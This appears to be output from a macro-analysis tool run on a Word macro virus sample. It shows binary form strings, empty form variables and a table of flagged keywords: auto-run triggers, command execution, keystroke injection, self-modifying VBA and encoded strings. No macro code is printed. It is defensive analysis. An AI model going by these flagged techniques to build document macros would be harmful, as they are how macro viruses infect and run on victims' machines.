VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ٿ�\��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� ��]���3Lďe�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

(�'�=��+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
L���+�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�n�f�̒vg�3�(�r��f�y�1K327Q�G��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
QI�8�=���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |UserForm_Layout     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

